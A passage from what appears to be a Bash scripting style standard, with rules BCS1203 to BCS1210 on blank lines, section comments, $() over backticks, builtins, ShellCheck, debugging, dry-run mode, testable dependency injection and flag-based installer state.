declare -i DRY_RUN=0
                                          # ← Blank line after variable group

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
                                          # ← Blank line before function
check_prerequisites() {
  info 'Checking prerequisites...'

  # Check for gcc                         # ← Blank line after info call
  if ! command -v gcc &> /dev/null; then
    die 1 "'gcc' compiler not found."
  fi

  success 'Prerequisites check passed'    # ← Blank line between checks
}
                                          # ← Blank line between functions
main() {
  check_prerequisites
  install_files
}

main "$@"
#fin
```

**Guidelines:**
- One blank line between functions
- One blank line between logical sections within functions
- One blank line after section comments and between variable groups
- Blank lines before/after multi-line conditional or loop blocks
- Avoid multiple consecutive blank lines; no blank line needed between short, related statements


---


**Rule: BCS1204**

## Section Comments

Use lightweight `# Description` comments to organize code into logical groups.

```bash
# Default values
declare -- PREFIX=/usr/local
declare -i VERBOSE=1
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc

# Core message function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  # ...
}

# Conditional messaging functions
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Unconditional messaging functions
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Guidelines:**
- Keep section comments short (2-4 words), no dashes or box drawing
- Place immediately before the group; blank line after the group
- Reserve 80-dash separators for major script divisions only

**Common patterns:** `# Default values`, `# Derived paths`, `# Core message function`, `# Helper functions`, `# Business logic`, `# Validation functions`


---


**Rule: BCS1205**

## Language Best Practices

### Command Substitution
Always use `$()` instead of backticks.

```bash
# ✓ Correct - modern syntax
var=$(command)

# ✗ Wrong - deprecated syntax
var=`command`
```

**Rationale:** `$()` is clearer, nests naturally without escaping, has better editor support.

**Nesting example:**
```bash
# ✓ Easy to read with $()
outer=$(echo "inner: $(date +%T)")

# ✗ Confusing with backticks (requires escaping)
outer=`echo "inner: \`date +%T\`"`
```

### Builtin Commands vs External Commands
Prefer shell builtins over external commands for performance (10-100x faster) and reliability.

```bash
# ✓ Good - bash builtins
addition=$((x + y))
string=${var^^}  # uppercase
string=${var,,}  # lowercase
if [[ -f "$file" ]]; then

# ✗ Avoid - external commands
addition=$(expr "$x" + "$y")
string=$(echo "$var" | tr '[:lower:]' '[:upper:]')
if [ -f "$file" ]; then
```

**Common replacements:**

| External Command | Builtin Alternative | Example |
|-----------------|---------------------|---------|
| `expr` | `$(())` | `$((x + y))` instead of `$(expr $x + $y)` |
| `basename` | `${var##*/}` | `${path##*/}` instead of `$(basename "$path")` |
| `dirname` | `${var%/*}` | `${path%/*}` instead of `$(dirname "$path")` |
| `tr` (case) | `${var^^}` or `${var,,}` | `${str,,}` instead of `$(echo "$str" \| tr A-Z a-z)` |
| `test`/`[` | `[[` | `[[ -f "$file" ]]` instead of `[ -f "$file" ]` |
| `seq` | `{1..10}` or `for ((i=1; i<=10; i+=1))` | Much faster for loops |

**When external commands are necessary:**
```bash
# Some operations have no builtin equivalent
checksum=$(sha256sum "$file")
current_user=$(whoami)
sorted_data=$(sort "$file")
```


---


**Rule: BCS1206**

## Development Practices

#### ShellCheck Compliance
ShellCheck is **compulsory**. Document exceptions with `#shellcheck disable=...` and reason:

```bash
#shellcheck disable=SC2046  # Intentional word splitting for flag expansion
set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"

shellcheck -x myscript.sh
```

#### Script Termination
```bash
main "$@"
#fin
```

#### Defensive Programming
```bash
: "${VERBOSE:=0}"
: "${DEBUG:=0}"
[[ -n "$1" ]] || die 1 'Argument required'
set -u
```

#### Performance Considerations
Minimize subshells; prefer built-in string operations; batch operations; use process substitution over temp files.

#### Testing Support
Make functions testable with dependency injection, verbose/debug modes, and meaningful exit codes.


---


**Rule: BCS1207**

## Debugging and Development

Enable debugging via environment variables and trace mode.

```bash
declare -i DEBUG="${DEBUG:-0}"
((DEBUG)) && set -x ||:
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '

debug() {
  ((DEBUG)) || return 0
  >&2 _msg "$@"
}
# Usage: DEBUG=1 ./script.sh
```


---


**Rule: BCS1208**

## Dry-Run Pattern

Implement preview mode for state-modifying operations.

```bash
declare -i DRY_RUN=0

# Parse from command-line
-n|--dry-run) DRY_RUN=1 ;;
-N|--not-dry-run) DRY_RUN=0 ;;

# Pattern: Check flag, show preview, return early
build_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would build standalone binaries'
    return 0
  fi
  make standalone || die 1 'Build failed'
}

install_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install:' \
         "  $BIN_DIR/mailheader" \
         "  $BIN_DIR/mailmessage"
    return 0
  fi
  install -m 755 build/bin/mailheader "$BIN_DIR"/
  install -m 755 build/bin/mailmessage "$BIN_DIR"/
}
```

**Pattern:** Check `((DRY_RUN))` at function start �' display `[DRY-RUN]` prefixed preview via `info` �' return 0 early �' real operations only when disabled.

**Benefits:** Safe preview of destructive operations; verify paths/files/commands before execution; identical control flow in both modes separates decision logic from action.


---


**Rule: BCS1209**

## Testing Support Patterns

Patterns for testable scripts: dependency injection, test modes, assertions.

```bash
# Dependency injection for testing
declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
declare -f CURL_CMD >/dev/null || CURL_CMD() { curl "$@"; }

# In production
find_files() {
  FIND_CMD "$@"
}

# In tests, override:
FIND_CMD() { echo 'mocked_file1.txt mocked_file2.txt'; }

# Test mode flag
declare -i TEST_MODE="${TEST_MODE:-0}"

# Conditional behavior for testing
if ((TEST_MODE)); then
  DATA_DIR=./test_data
  RM_CMD() { echo "TEST: Would remove $*"; }
else
  DATA_DIR=/var/lib/app
  RM_CMD() { rm "$@"; }
fi

# Assert function for tests
assert() {
  local -- expected=$1
  local -- actual=$2
  local -- message=${3:-Assertion failed}

  if [[ "$expected" != "$actual" ]]; then
    >&2 echo "ASSERT FAIL: $message"
    >&2 echo "  Expected: '$expected'"
    >&2 echo "  Actual:   '$actual'"
    return 1
  fi
  return 0
}

# Test runner pattern
run_tests() {
  local -i passed=0 failed=0
  local -- test_func

  for test_func in $(declare -F | awk '$3 ~ /^test_/ {print $3}'); do
    if "$test_func"; then
      passed+=1
      echo "✓ $test_func"
    else
      failed+=1
      echo "✗ $test_func"
    fi
  done

  echo "Tests: $passed passed, $failed failed"
  ((failed == 0))
}
```

**Key Patterns:**
- **Dependency injection**: Wrap external commands in functions; override in tests
- **Test mode flag**: `declare -i TEST_MODE` controls destructive operations
- **Assertions**: Compare expected vs actual with clear failure messages
- **Test discovery**: Find `test_*` functions via `declare -F`


---


**Rule: BCS1210**

## Progressive State Management

Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.

```bash
# Initial flag declarations
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# Parse command-line arguments
main() {
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
    esac
    shift
  done

  # Progressive state management: adjust flags based on runtime conditions

  # If user explicitly requested to skip, disable installation
  if ((SKIP_BUILTIN)); then
    INSTALL_BUILTIN=0
  fi

  # Check if prerequisites are met, adjust flags accordingly
  if ! check_builtin_support; then
    # If user explicitly requested builtins, try to install dependencies
    if ((BUILTIN_REQUESTED)); then
      warn 'bash-builtins package not found, attempting to install...'
      install_bash_builtins || {
        error 'Failed to install bash-builtins package'
        INSTALL_BUILTIN=0  # Disable builtin installation
      }
    else
      # User didn't explicitly request, just skip
      info 'bash-builtins not found, skipping builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Build phase: disable on failure
  if ((INSTALL_BUILTIN)); then
    if ! build_builtin; then
      error 'Builtin build failed, disabling builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Execution phase: actions based on final flag state
  install_standalone
  ((INSTALL_BUILTIN)) && install_builtin  # Only runs if still enabled

  show_completion_message
}
```

**Pattern structure:**
1. Declare boolean flags at top with initial values
2. Parse arguments, setting flags based on user input
3. Progressively adjust flags based on runtime conditions (dependency checks, build failures, user overrides)
4. Execute actions based on final flag state

**State progression example:**
```bash
# Initial state (defaults)
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# 1. User input (--builtin flag)
INSTALL_BUILTIN=1
BUILTIN_REQUESTED=1

# 2. Override check (--no-builtin takes precedence)
((SKIP_BUILTIN)) && INSTALL_BUILTIN=0 ||:

# 3. Dependency check (no bash-builtins package)
if ! check_builtin_support; then
  if ((BUILTIN_REQUESTED)); then
    # Try to install, disable on failure
    install_bash_builtins || INSTALL_BUILTIN=0
  else
    # User didn't ask, just disable
    INSTALL_BUILTIN=0
  fi
fi

# 4. Build check (compilation failed)
((INSTALL_BUILTIN)) && ! build_builtin && INSTALL_BUILTIN=0

# 5. Final execution (only runs if INSTALL_BUILTIN=1)
((INSTALL_BUILTIN)) && install_builtin
```

**Benefits:** Clean separation of decision/action logic; traceable flag changes; fail-safe behavior; preserves user intent via separate tracking flag; idempotent execution.

**Guidelines:**
- Group related flags (`INSTALL_*`, `SKIP_*`)
- Use separate flags for user intent vs runtime state
- Apply state changes in order: parse �' validate �' execute
- Never modify flags during execution phase

**Rationale:** Enables scripts to adapt to runtime conditions while maintaining decision clarity. Essential for installation scripts where features may need disabling based on system capabilities or build failures.
#fin
